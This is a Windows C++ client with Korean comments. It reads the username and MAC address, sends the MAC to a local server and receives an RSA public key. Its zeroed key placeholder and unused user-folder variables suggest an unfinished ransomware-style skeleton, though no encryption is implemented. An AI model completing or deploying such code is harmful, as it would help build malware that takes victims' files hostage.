#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h> // IP Helper 라이브러리
#include <iostream>
#include <fstream>
#include <time.h>
#include <ctime>
#include <openssl/ssl.h>
#include <openssl/pem.h>
#include "framework.h"
#include "client.h"

using namespace std;

#pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib") // IP Helper 라이브러리
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#define UNLEN 128
#define DEFAULT_PORT "8080"

std::string GetMacAddress();
bool receiveAndSavePublicKey(SOCKET ConnectSocket);


int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
    DWORD username_len = UNLEN + 1;
    char userName[UNLEN + 1];
    string filename = "C:\\Users";
    string downloadname, documentsname, desktopname, foldername;

    // 사용자 이름 알아내기
    GetUserNameA(userName, &username_len);
    cout << "username: " << userName << endl;
    cout << endl;
    string userNameStr(userName);

    // 암호화 키 생성 
    unsigned char key[32] = { 0x00, }; //generateKey();

    cout << GetMacAddress() << endl;


    // Server 랑 통신용 소켓 
    WSADATA wsaData;
    int iResult;

    // Winsock 초기화
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    // 서버 정보 설정
    struct addrinfo *result = nullptr, *ptr = nullptr, hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    // 서버에 연결
    SOCKET ConnectSocket = INVALID_SOCKET;
    ptr = result;

    // 소켓 생성
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // 서버에 연결
    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }
    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Unable to connect to server!" << std::endl;
        WSACleanup();
        return 1;
    }

    std::string macAddress = GetMacAddress();

    // MAC 주소 전송
    if (send(ConnectSocket, macAddress.c_str(), macAddress.length(), 0) == SOCKET_ERROR) {
        std::cerr << "MAC 주소 전송 실패" << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
    }

    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}





// MAC 주소 가져오는 함수
std::string GetMacAddress() {
    ULONG ulOutBufLen = 0;
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    std::string macAddress = "";

    // GetAdaptersInfo 호출하여 버퍼의 크기 가져오기
    if (GetAdaptersInfo(NULL, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        // 버퍼 할당
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return macAddress;
        }

        // 어댑터 정보 가져오기
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            // 첫 번째 어댑터의 MAC 주소 가져오기
            if (pAdapterInfo->AddressLength > 0) {
                for (DWORD i = 0; i < pAdapterInfo->AddressLength; i++) {
                    // MAC 주소를 16진수 문자열로 변환하여 macAddress에 저장
                    char temp[3];
                    sprintf_s(temp, "%02X", (int)pAdapterInfo->Address[i]);
                    macAddress += temp;

                    // MAC 주소 구분자 (:) 추가
                    if (i < pAdapterInfo->AddressLength - 1) {
                        macAddress += ":";
                    }
                }
            }
        }

        // 할당된 메모리 해제
        free(pAdapterInfo);
    }

    return macAddress;
}


bool receiveAndSavePublicKey(SOCKET ConnectSocket) {
    const int bufferSize = 4096; // 공개 키의 최대 길이로 조정
    char recvBuffer[bufferSize];
    int iResult = recv(ConnectSocket, recvBuffer, bufferSize, 0);
    if (iResult <= 0) {
        std::cerr << "Failed to receive public key from server" << std::endl;
        return false;
    }

    // PEM 형식으로 공개 키 변환
    std::string publicKeyStr(recvBuffer, iResult);
    BIO* bio = BIO_new_mem_buf(publicKeyStr.c_str(), -1);
    RSA* rsaKey = PEM_read_bio_RSA_PUBKEY(bio, nullptr, nullptr, nullptr);
    if (rsaKey == nullptr) {
        std::cerr << "Failed to convert public key to PEM format" << std::endl;
        return false;
    }

    // PEM 파일로 저장
    FILE* pemFile = fopen("public_key.pem", "wb");
    if (pemFile == nullptr) {
        std::cerr << "Failed to create PEM file" << std::endl;
        RSA_free(rsaKey);
        return false;
    }
    if (PEM_write_RSAPublicKey(pemFile, rsaKey) == 0) {
        std::cerr << "Failed to write public key to PEM file" << std::endl;
        RSA_free(rsaKey);
        fclose(pemFile);
        return false;
    }

    RSA_free(rsaKey);
    fclose(pemFile);

    std::cout << "Public key received and saved to public_key.pem" << std::endl;
    return true;
}

